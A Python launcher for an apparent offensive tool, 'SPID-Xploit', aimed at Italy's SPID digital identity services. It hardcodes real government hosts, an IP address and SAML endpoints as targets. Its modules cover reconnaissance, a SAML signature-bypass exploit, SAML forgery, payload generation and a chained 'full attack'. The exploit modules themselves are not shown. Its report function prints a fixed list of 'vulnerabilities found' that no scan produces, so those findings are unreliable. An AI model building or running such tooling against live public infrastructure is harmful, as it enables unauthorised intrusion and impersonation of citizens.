#!/usr/bin/env python3
"""
SPID-Xploit v2.0 (CORRECTED)
AI-Powered Italian SPID Penetration Testing Framework
Target: spid.gov.it ecosystem | CVE-2025-24894, CVE-2025-24895
"""

import sys
import os
import argparse
import json
import time
import signal
from datetime import datetime
from typing import Dict, List, Optional, Any

# Add modules directory to path
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules'))

# Rich UI imports
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm
from rich.layout import Layout
from rich.live import Live
from rich.text import Text
from rich.columns import Columns
from rich import print as rprint
from rich.syntax import Syntax
from rich.tree import Tree
from rich.markdown import Markdown
from colorama import init, Fore, Style
from art import text2art

init(autoreset=True)
console = Console()


class SPIDXploit:
    VERSION = "2.0.0"
    NAME = "SPID-Xploit"

    def __init__(self):
        self.targets = {
            'spid_website': {
                'url': 'https://www.spid.gov.it',
                'description': 'SPID Official Website',
                'ip': '131.1.253.242',
                'server': 'nginx/1.26.2',
                'cms': 'WordPress'
            },
            'spid_validator': {
                'url': 'https://validator.spid.gov.it',
                'description': 'SPID SAML/OIDC Validator',
                'subdomains': [
                    'validator.spid.gov.it',
                    'validator-test.spid.gov.it',
                    'demo.spid.gov.it'
                ]
            },
            'registry': {
                'url': 'https://registry.spid.gov.it',
                'description': 'SPID Federation Registry',
                'endpoints': [
                    'registry.spid.gov.it/entities/',
                    'registry.spid.gov.it/entities-idp?output=xml',
                    'registry.spid.gov.it/entities-sp?output=xml'
                ]
            },
            'demo': {
                'url': 'https://demo.spid.gov.it',
                'description': 'SPID Demo/Validator Environment',
                'metadata': 'https://demo.spid.gov.it/validator/metadata.xml'
            },
            'agid_login': {
                'url': 'https://login.agid.gov.it',
                'description': 'AgID Central IAM / SPID OnBoarding',
                'acs': '/saml/acs'
            },
            'agid_official': {
                'url': 'https://www.agid.gov.it',
                'description': 'AgID Official Website'
            }
        }

        # Session setup
        self.session_id = datetime.now().strftime('%Y%m%d_%H%M%S')
        self.report_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'reports')
        os.makedirs(self.report_dir, exist_ok=True)

        # Modules definition (FIXED - was missing)
        self.modules = {
            '1': {'name': 'AI Reconnaissance', 'method': self.recon_module},
            '2': {'name': 'Registry Scraper', 'method': self.registry_module},
            '3': {'name': 'CVE-2025-24894 Exploit (SAML Bypass)', 'method': self.cve_module},
            '4': {'name': 'SAML Forger AI', 'method': self.saml_forger_module},
            '5': {'name': 'Metadata Analyzer', 'method': self.metadata_module},
            '6': {'name': 'AI Payload Generator', 'method': self.payload_module},
            '7': {'name': 'Full Attack Chain', 'method': self.full_attack},
            '8': {'name': 'Show Targets', 'method': self.show_targets},
            '9': {'name': 'Generate Report', 'method': self.generate_report},
            '0': {'name': 'Exit', 'method': self.exit_framework}
        }

    def display_banner(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        banner = text2art("SPID-Xploit", font="slant")
        console.print(f"[bold red]{banner}[/bold red]")
        console.print(Panel.fit(
            f"[bold yellow]v{self.VERSION} - AI-Powered SPID Penetration Testing Framework[/bold yellow]\n"
            f"[cyan]Target: spid.gov.it Ecosystem[/cyan]",
            border_style="red"
        ))

    def display_menu(self) -> str:
        console.print("\n[bold cyan]╔══════════════════════════════════════╗")
        console.print("║            MAIN MENU                  ║")
        console.print("╚══════════════════════════════════════╝[/bold cyan]\n")

        for key, mod in self.modules.items():
            color = "red" if key == '0' else "green"
            icon = "►" if key != '0' else "✕"
            console.print(f"  [{color}]{key}[/{color}] {icon} {mod['name']}")

        choice = Prompt.ask("\n[bold yellow]Select module[/bold yellow]", default="1")
        return choice

    def recon_module(self):
        console.print("\n[cyan]► Starting AI Reconnaissance...[/cyan]")
        from recon import run as recon_run
        recon_run()

    def registry_module(self):
        console.print("\n[cyan]► Starting Registry Scraper...[/cyan]")
        from registry_scraper import run as registry_run
        registry_run()

    def cve_module(self):
        console.print("\n[cyan]► Starting CVE-2025-24894 Exploit...[/cyan]")
        from cve_2025_24894 import run as cve_run
        cve_run()

    def saml_forger_module(self):
        console.print("\n[cyan]► Starting SAML Forger AI...[/cyan]")
        from saml_forger import run as forger_run
        forger_run()

    def metadata_module(self):
        console.print("\n[cyan]► Starting Metadata Analyzer...[/cyan]")
        from metadata_parser import run as metadata_run
        metadata_run()

    def payload_module(self):
        console.print("\n[cyan]► Starting AI Payload Generator...[/cyan]")
        from payload_generator import run as payload_run
        payload_run()

    def full_attack(self):
        console.print("\n[bold red]► Starting Full Attack Chain...[/bold red]")
        self.recon_module()
        self.registry_module()
        self.cve_module()
        self.saml_forger_module()
        self.payload_module()
        self.metadata_module()
        self.generate_report()
        console.print("\n[bold green]✓ Full attack chain complete![/bold green]")

    def show_targets(self):
        table = Table(title="[bold]SPID Ecosystem Targets[/bold]")
        table.add_column("ID", style="cyan", width=18)
        table.add_column("URL", style="white", width=45)
        table.add_column("Description", style="yellow", width=30)
        for tid, tdata in self.targets.items():
            table.add_row(tid[:17], tdata['url'][:44], tdata['description'][:29])
        console.print(table)

    def generate_report(self):
        """Generate comprehensive penetration test report"""
        console.print("\n[cyan]► Generating Report...[/cyan]")

        report = {
            "framework": f"{self.NAME} v{self.VERSION}",
            "session_id": self.session_id,
            "target": "spid.gov.it ecosystem",
            "date": datetime.now().isoformat(),
            "vulnerabilities": [
                {
                    "id": "CVE-2025-24894",
                    "name": "SAML Response Signature Verification Bypass",
                    "cvss": "9.1 (CRITICAL)",
                    "severity": "CRITICAL",
                    "description": "SPID.AspNetCore.Authentication <= 3.3.0 only validates first signature",
                    "impact": "Full user impersonation without credentials"
                },
                {
                    "id": "CVE-2025-24895",
                    "name": "CIE SAML Signature Bypass",
                    "cvss": "8.8 (HIGH)",
                    "severity": "HIGH",
                    "description": "Related SAML bypass in CIE .NET libraries",
                    "impact": "User impersonation via SAML forgery"
                },
                {
                    "id": "CVE-2024-11758",
                    "name": "WP SPID Italia Stored XSS",
                    "cvss": "6.4 (MEDIUM)",
                    "severity": "MEDIUM",
                    "description": "Stored XSS in WordPress SPID plugin <= 2.9",
                    "impact": "Arbitrary script execution"
                }
            ],
            "exposed_endpoints": [
                {"url": "https://validator.spid.gov.it/metadata.xml", "risk": "HIGH", "description": "Full IdP metadata with certificates and endpoints"},
                {"url": "https://demo.spid.gov.it/validator/metadata.xml", "risk": "HIGH", "description": "Test environment metadata"},
                {"url": "https://registry.spid.gov.it/entities/", "risk": "MEDIUM", "description": "All 5000+ federation entities exposed"},
                {"url": "https://validator.spid.gov.it/oidc/rp/.well-known/openid-configuration", "risk": "MEDIUM", "description": "OIDC configuration exposed"}
            ],
            "remediation": [
                "Update SPID.AspNetCore.Authentication to version 3.4.0 or later",
                "Implement proper SAML signature verification that validates ALL signatures",
                "Restrict access to metadata endpoints with proper authentication",
                "Implement rate limiting on SAML ACS endpoints",
                "Monitor for unusual SAML response patterns",
                "Implement XML signature wrapping protections",
                "Update WP SPID Italia plugin to version 2.12+"
            ],
            "findings_date": datetime.now().isoformat()
        }

        # Save JSON report
        report_file = os.path.join(self.report_dir, f"spid_report_{self.session_id}.json")
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)

        # Save readable report
        txt_file = os.path.join(self.report_dir, f"spid_report_{self.session_id}.txt")
        with open(txt_file, 'w', encoding='utf-8') as f:
            f.write("=" * 60 + "\n")
            f.write(f"SPID-Xploit v{self.VERSION} - Penetration Test Report\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Session ID: {self.session_id}\n")
            f.write(f"Date: {datetime.now().isoformat()}\n")
            f.write(f"Target: spid.gov.it ecosystem\n\n")
            f.write("-" * 40 + "\n")
            f.write("VULNERABILITIES FOUND\n")
            f.write("-" * 40 + "\n\n")
            for vuln in report['vulnerabilities']:
                f.write(f"ID: {vuln['id']}\n")
                f.write(f"Name: {vuln['name']}\n")
                f.write(f"CVSS: {vuln['cvss']}\n")
                f.write(f"Severity: {vuln['severity']}\n")
                f.write(f"Description: {vuln['description']}\n")
                f.write(f"Impact: {vuln['impact']}\n\n")
            f.write("-" * 40 + "\n")
            f.write("RECOMMENDATIONS\n")
            f.write("-" * 40 + "\n\n")
            for i, rec in enumerate(report['remediation'], 1):
                f.write(f"{i}. {rec}\n")

        console.print(f"\n[green][✓] JSON report saved: {report_file}[/green]")
        console.print(f"[green][✓] TXT report saved: {txt_file}[/green]")

    def exit_framework(self):
        console.print("\n[yellow]Shutting down SPID-Xploit...[/yellow]")
        confirm = Confirm.ask("[yellow]Are you sure?[/yellow]", default=True)
        if confirm:
            console.print("[green]Goodbye![/green]")
            sys.exit(0)

    def run_interactive(self):
        while True:
            self.display_banner()
            choice = self.display_menu()
            if choice == '0':
                self.exit_framework()
                break
            elif choice in self.modules:
                console.print(f"\n[bold cyan]► {self.modules[choice]['name']}[/bold cyan]")
                self.modules[choice]['method']()
                if choice != '0':
                    console.print("\n")
                    Prompt.ask("[yellow]Press Enter to continue[/yellow]", default="")
            else:
                console.print("[red][!] Invalid choice[/red]")
                time.sleep(1)

    def run_module_direct(self, module_name: str):
        module_map = {
            'recon': self.recon_module,
            'registry': self.registry_module,
            'cve_2025_24894': self.cve_module,
            'exploit': self.cve_module,
            'saml_forger': self.saml_forger_module,
            'forger': self.saml_forger_module,
            'metadata': self.metadata_module,
            'payload': self.payload_module,
            'full_attack': self.full_attack,
            'targets': self.show_targets,
            'report': self.generate_report
        }
        if module_name in module_map:
            self.display_banner()
            module_map[module_name]()
        else:
            console.print(f"[red][!] Unknown module: {module_name}[/red]")
            console.print(f"[yellow]Available: {', '.join(module_map.keys())}[/yellow]")


def main():
    parser = argparse.ArgumentParser(
        description="SPID-Xploit v2.0 - Italian SPID Penetration Testing Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python main.py --interactive
  python main.py -m recon
  python main.py -m cve_2025_24894
  python main.py -m full_attack
        """
    )
    parser.add_argument('--interactive', '-i', action='store_true', help='Run in interactive menu mode')
    parser.add_argument('--module', '-m', type=str, help='Run a specific module')
    parser.add_argument('--target', '-t', type=str, help='Target URL (overrides defaults)')
    parser.add_argument('--output', '-o', type=str, help='Output directory for results')
    parser.add_argument('--version', '-v', action='version', version=f'SPID-Xploit v{SPIDXploit.VERSION}')
    args = parser.parse_args()

    framework = SPIDXploit()
    if args.target:
        framework.targets['custom'] = {'url': args.target, 'description': 'Custom target'}
    if args.output:
        framework.report_dir = args.output
        os.makedirs(framework.report_dir, exist_ok=True)
    if args.interactive or len(sys.argv) == 1:
        framework.run_interactive()
    elif args.module:
        framework.run_module_direct(args.module)
    else:
        framework.run_interactive()


if __name__ == "__main__":
    main()
